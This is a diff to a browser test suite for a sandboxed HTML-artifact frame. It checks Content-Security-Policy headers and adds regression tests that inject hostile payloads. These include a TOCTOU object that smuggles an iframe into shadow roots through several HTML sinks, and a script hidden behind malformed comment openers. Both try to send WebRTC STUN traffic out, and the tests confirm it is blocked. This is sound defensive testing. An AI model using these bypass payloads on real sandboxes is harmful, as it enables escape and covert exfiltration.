@@ -11,6 +11,7 @@ import {
   CLEAN_PAGE,
   installCodeStore,
   installCodeThread,
+  frameCsp,
   PROFILE,
   THREAD,
   type CodeRec,
@@ -136,7 +137,18 @@ test("the frame's attributes and document headers are exact", async ({
   );
   expect(await el.getAttribute("allow")).toBeNull();
   const r = await response;
-  expect(r.headers()["content-security-policy"]).toBe(PROFILE.csp);
+  const csp = r.headers()["content-security-policy"]!;
+  expect(csp).toBe(frameCsp(await r.text()));
+  // The Apps profile: hashes only, Trusted Types with no policy.
+  expect(csp).toMatch(
+    /script-src 'sha256-[A-Za-z0-9+/=]+'( 'sha256-[A-Za-z0-9+/=]+')*;/,
+  );
+  expect(csp.split("script-src")[1]!.split(";")[0]).not.toContain(
+    "unsafe-inline",
+  );
+  expect(csp).toContain(
+    "require-trusted-types-for 'script'; trusted-types 'none'",
+  );
   for (const [k, v] of Object.entries(PROFILE.headers))
     expect(r.headers()[k.toLowerCase()]).toBe(v);
   const frame = await liveFrame(page);
@@ -466,4 +478,92 @@ test("N cards, at most one live frame; failed and unchecked versions are labelle
     await expect(
       page.locator(`[data-artifact="${id}"] [data-testid="artifact-frame"]`),
     ).toHaveCount(0);
+});
+
+/** A child realm's script that sends STUN to the UDP listener. */
+const childRtc = (udp: string) =>
+  `try{var p=new RTCPeerConnection({iceServers:[{urls:'stun:${udp}'}]});p.createDataChannel('x');p.createOffer().then(function(o){return p.setLocalDescription(o)})}catch(e){}`;
+
+/** Review payloads: a value whose toString answers "x" when checked and a
+ * frame when written, into a shadow root (which a document observer does not
+ * see), each HTML sink in turn. */
+function toctouScript(udp: string, sink: string): string {
+  const frameHtml =
+    `<iframe srcdoc="<script>${childRtc(udp).replace(/"/g, "&quot;")}</` +
+    `script>"></iframe>`;
+  return `
+(function(){
+  var evil = { n: 0, toString: function () { return this.n++ ? ${JSON.stringify(frameHtml).replace(/<\//g, "<\\/")} : 'x'; } };
+  var host = document.createElement('div'); document.body.appendChild(host);
+  try {
+    var mode = ${JSON.stringify(sink)};
+    var sr = host.attachShadow({ mode: mode === 'closed' ? 'closed' : 'open' });
+    if (mode === 'open' || mode === 'closed') sr.innerHTML = evil;
+    else if (mode === 'adjacent') { var t = document.createElement('div'); sr.appendChild(t); t.insertAdjacentHTML('beforeend', evil); }
+    else if (mode === 'outer') { var o = document.createElement('div'); sr.appendChild(o); o.outerHTML = evil; }
+    else if (mode === 'fragment') { sr.appendChild(document.createRange().createContextualFragment(evil)); }
+    else if (mode === 'unsafe') { sr.setHTMLUnsafe(evil); }
+  } catch (e) { window.__err = String(e); }
+  setTimeout(function () { document.body.setAttribute('data-rtc-done', '1'); }, 400);
+})();`;
+}
+
+for (const sink of [
+  "open",
+  "closed",
+  "adjacent",
+  "outer",
+  "fragment",
+  "unsafe",
+]) {
+  test(`review payload: a two-faced value into a shadow root (${sink}) opens no realm and sends no STUN`, async ({
+    page,
+  }) => {
+    const rec: CodeRec = {
+      id: ID("T"),
+      kind: "html",
+      title: "TOCTOU",
+      html: doc(toctouScript(udpTarget, sink)),
+    };
+    await openChat(page, [rec]);
+    const frame = await liveFrame(page);
+    await page.waitForTimeout(4500);
+    const why = await frame
+      .evaluate(() =>
+        JSON.stringify({
+          err: (window as unknown as { __err?: string }).__err ?? null,
+          frames: window.length,
+        }),
+      )
+      .catch(() => "frame gone");
+    expect(packets, why).toEqual([]);
+    expect(
+      await frame.evaluate(() => document.body.dataset.rtcDone ?? ""),
+    ).toBe("1"); // the payload did run
+  });
+}
+
+test("review payload: a script hidden from the gateway's parser in a comment runs not at all (or after the shim), sends no STUN", async ({
+  page,
+}) => {
+  const hidden = `window.__P = window['RTC' + 'PeerConnection'];`;
+  const use = `try { if (window.__P) { var p = new window.__P({iceServers:[{urls:'stun:${udpTarget}'}]}); p.createDataChannel('x'); p.createOffer().then(function(o){return p.setLocalDescription(o)}); } } catch (e) {}`;
+  for (const opener of ["<!-->", "<!--->"]) {
+    packets.length = 0;
+    const html = `<!doctype html>${opener}<script>${hidden}</script><!-- --><main><p>x</p></main><script>${use}</script>`;
+    const ctx = await page.context().browser()!.newContext();
+    const p2 = await ctx.newPage();
+    await openChat(p2, [
+      {
+        id: ID(opener === "<!-->" ? "C" : "D"),
+        kind: "html",
+        title: "Comment",
+        html,
+      },
+    ]);
+    await liveFrame(p2);
+    await p2.waitForTimeout(4000);
+    expect(packets, opener).toEqual([]);
+    await ctx.close();
+  }
 });
